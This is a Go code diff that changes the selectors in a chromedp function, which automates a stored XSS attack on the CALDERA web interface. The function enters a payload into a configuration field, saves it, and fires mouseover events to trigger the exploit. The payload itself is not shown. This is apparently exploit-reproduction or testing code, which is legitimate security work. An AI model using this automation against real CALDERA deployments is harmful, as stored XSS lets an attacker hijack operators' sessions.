@@ -106,12 +106,12 @@ func storedXSSTresVuln(payload string) error {
 	var buf []byte
 	var res *runtime.RemoteObject
 
-	// XPath and selectors for chromeDP
-	configLinkXPath := "/html/body/main/div[1]/aside/ul[3]/li[6]/a"
-	gistInputXPath := "/html/body/main/div[2]/div[2]/div/div/div[2]/div[2]/table/tbody/tr[9]/td[2]/input"
-	updateGistButtonXPath := "/html/body/main/div[2]/div[2]/div/div/div[2]/div[2]/table/tbody/tr[9]/td[3]/button"
-	debriefLinkXPath := "/html/body/main/div[1]/aside/ul[2]/li[4]/a"
-	firstOperationXPath := "/html/body/main/div[2]/div[2]/div[2]/div/div[2]/div[2]/div[1]/form/div/div/div/select/option[1]"
+	// Selectors for chromeDP
+	configLinkSelector := `a.nav-item[x-on\:click*="configuration"]`
+	gistInputSelector := `input[x-model="prop.value"]`
+	updateGistButtonSelector := `button[x-on\:click="updateConfig(prop)"]`
+	debriefLinkSelector := `a.nav-item[x-on\:click*="debrief"]`
+	firstOperationSelector := `select[x-model="selectedOperationID"] option:first-of-type`
 	triggerVulnJS := "nodes = document.querySelectorAll('[id^=node]'); nodes.forEach((x, i) => x.dispatchEvent(new MouseEvent('mouseover', {'bubbles': true})));"
 
 	imagePath := viper.GetString("image_path")
@@ -158,18 +158,18 @@ func storedXSSTresVuln(payload string) error {
 	if err := chromedp.Run(caldera.Driver.Context,
 		network.Enable(),
 		// Click the configuration link
-		chromedp.Click(configLinkXPath),
+		chromedp.Click(configLinkSelector),
 		chromedp.Sleep(Wait(2000)),
 		// Introduce the payload
-		chromedp.SendKeys(gistInputXPath, payload),
+		chromedp.SendKeys(gistInputSelector, payload),
 		chromedp.Sleep(Wait(2000)),
 		// Update the gist configuration with the malicious payload
-		chromedp.Click(updateGistButtonXPath),
+		chromedp.Click(updateGistButtonSelector),
 		chromedp.Sleep(Wait(2000)),
 		// Click the debrief link
-		chromedp.Click(debriefLinkXPath),
+		chromedp.Click(debriefLinkSelector),
 		// Click the operation with the payload that we introduced previously
-		chromedp.Click(firstOperationXPath),
+		chromedp.Click(firstOperationSelector),
 		chromedp.Sleep(Wait(2000)),
 		// Move mouse over C2 Server image to trigger the exploit
 		chromedp.Evaluate(triggerVulnJS, &res),
